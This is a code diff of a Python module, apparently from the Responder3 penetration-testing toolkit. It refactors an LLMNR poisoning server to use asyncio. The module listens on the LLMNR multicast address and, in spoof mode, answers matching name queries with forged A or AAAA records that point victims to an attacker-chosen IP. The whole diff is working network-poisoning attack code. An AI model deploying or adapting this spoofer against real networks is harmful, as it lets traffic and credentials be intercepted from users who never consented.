@@ -1,31 +1,45 @@
-import io
-import os
-import re
-import logging
-import traceback
 import socket
 import struct
-import enum
-import traceback
+import logging
+import asyncio
 import ipaddress
+import traceback
 
+from responder3.core.commons import *
 from responder3.protocols.LLMNR import * 
 from responder3.protocols.DNS import * 
-from responder3.servers.BASE import ResponderServer, ResponderProtocolUDP, ProtocolSession, PoisonerMode
+from responder3.core.servertemplate import ResponderServer, ResponderServerSession
 
-class LLMNRSession(ProtocolSession):
-	def __init__(self, server):
-		ProtocolSession.__init__(self, server)
+
+class LLMNRSession(ResponderServerSession):
+	pass
 
 class LLMNR(ResponderServer):
-	def __init__(self):
-		ResponderServer.__init__(self)
+	def custom_socket(server_properties):
+		if server_properties.bind_addr.version == 4:
+			ip = ipaddress.ip_address('224.0.0.252')
+			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+			sock.setblocking(False)#SUPER IMPORTANT TO SET THIS FOR ASYNCIO!!!!
+			sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+			sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
+			sock.bind(('0.0.0.0', 5355))
+			mreq = struct.pack("=4sl", server_properties.bind_addr.packed, socket.INADDR_ANY)
+			sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
 
-	def modulename(self):
-		return 'LLMNR'
+		else:
+			#http://code.activestate.com/recipes/442490-ipv6-multicast/
+			ip = ipaddress.ip_address('FF02:0:0:0:0:0:1:3')
+			interface_index = socket.if_nametoindex('ens33')
+			sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+			sock.bind(('::', 5355, 0, interface_index))
+			sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP,
+				struct.pack('16sI', ip.packed, interface_index))
+			sock.setblocking(False)#SUPER IMPORTANT TO SET THIS FOR ASYNCIO!!!!
 
-	def setup(self):
-		self.protocol = LLMNRProtocol
+		return sock
+
+	def init(self):
+		self.parser = LLMNRPacket
 		self.spoofTable = []
 		if self.settings is None:
 			self.log(logging.INFO, 'No settings defined, adjusting to Analysis functionality!')
@@ -39,75 +53,51 @@ class LLMNR(ResponderServer):
 
 			#compiling re strings to actual re objects and converting IP strings to IP objects
 			if self.settings['mode'] == PoisonerMode.SPOOF:
-				for exp in self.settings['spoofTable']:
-					if exp == 'ALL':
-						self.spoofTable.append((re.compile('.*'),ipaddress.ip_address(self.settings['spoofTable'][exp])))
-						continue
-					self.spoofTable.append((re.compile(exp),ipaddress.ip_address(self.settings['spoofTable'][exp])))
+				for exp in self.settings['spooftable']:
+					self.spoofTable.append((re.compile(exp),ipaddress.ip_address(self.settings['spooftable'][exp])))
 
+	@asyncio.coroutine
+	def parse_message(self):
+		msg = yield from asyncio.wait_for(self.parser.from_streamreader(self.creader), timeout=1)
+		return msg
 
+	@asyncio.coroutine
+	def send_data(self, data):
+		yield from asyncio.wait_for(self.cwriter.write(data), timeout=1)
+		return
+
+	@asyncio.coroutine
 	def run(self):
-		#need to do some wizardy with the socket setting here
-		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-		sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
-		sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
-		sock.bind(('', self.bind_port))
-		mreq = struct.pack("=4sl", self.bind_addr.packed, socket.INADDR_ANY)
-		sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
-
-		coro = self.loop.create_datagram_endpoint(
-							protocol_factory=lambda: LLMNRProtocol(self),
-							sock = sock
-		)
-
-		return self.loop.run_until_complete(coro)
-
-	def handle(self, packet, addr, transport, session):
-		if 'R3DEEPDEBUG' in os.environ:
-				self.log(logging.INFO,'Packet: %s' % (repr(packet),), session)
 		try:
+			msg = yield from asyncio.wait_for(self.parse_message(), timeout=1)
 			if self.settings['mode'] == PoisonerMode.ANALYSE:
-				for q in packet.Questions:
-					self.logPoisonResult(session, requestName = q.QNAME)
+				for q in msg.Questions:
+					self.logPoisonResult(requestName = q.QNAME.name)
 
 			else:
 				answers = []
 				for targetRE, ip in self.spoofTable:
-					for q in packet.Questions:
+					for q in msg.Questions:
 						if targetRE.match(q.QNAME.name):
-							self.logPoisonResult(session, requestName = q.QNAME.name, poisonName = str(targetRE), poisonIP = ip)
+							self.logPoisonResult(requestName = q.QNAME.name, poisonName = str(targetRE), poisonIP = ip)
 							if ip.version == 4:
 								res = DNSAResource.construct(q.QNAME.name, ip)
 							elif ip.version == 6:
 								res = DNSAAAAResource.construct(q.QNAME.name, ip)
 							else:
 								raise Exception('This IP version scares me...')
-							#res.construct(q.QNAME, NBRType.NB, ip)
 							answers.append(res)
 				
-				response = LLMNRPacket.construct(  TID = packet.TransactionID, 
+				response = LLMNRPacket.construct(  TID = msg.TransactionID, 
 									 response = LLMNRResponse.RESPONSE, 
 									 answers = answers,
-									 questions = packet.Questions
+									 questions = msg.Questions
 								  )
-
-				transport.sendto(response.toBytes(), addr)
-			
+				yield from asyncio.wait_for(self.send_data(response.toBytes()), timeout=1)
 
 		except Exception as e:
 			traceback.print_exc()
-			self.log(logging.INFO,'Exception! %s' % (str(e),))
+			self.log('Exception! %s' % (str(e),))
 			pass
-		
 
 
-class LLMNRProtocol(ResponderProtocolUDP):
-	
-	def __init__(self, server):
-		ResponderProtocolUDP.__init__(self, server)
-		self._session = LLMNRSession(server.rdnsd)
-
-	def _parsebuff(self, addr):
-		packet = LLMNRPacket.from_bytes(self._buffer)
-		self._server.handle(packet, addr, self._transport, self._session)
-		self._buffer = b''
